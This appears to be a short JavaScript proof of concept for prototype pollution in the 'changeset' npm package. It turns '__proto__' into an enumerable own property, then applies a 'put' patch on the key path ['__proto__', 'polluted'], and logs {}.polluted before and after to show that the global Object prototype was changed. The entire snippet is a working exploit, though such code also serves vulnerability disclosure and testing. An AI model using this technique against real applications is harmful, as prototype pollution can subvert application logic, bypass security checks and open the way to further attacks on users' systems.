var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            '__proto__',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, obj, true);
console.log({}.polluted);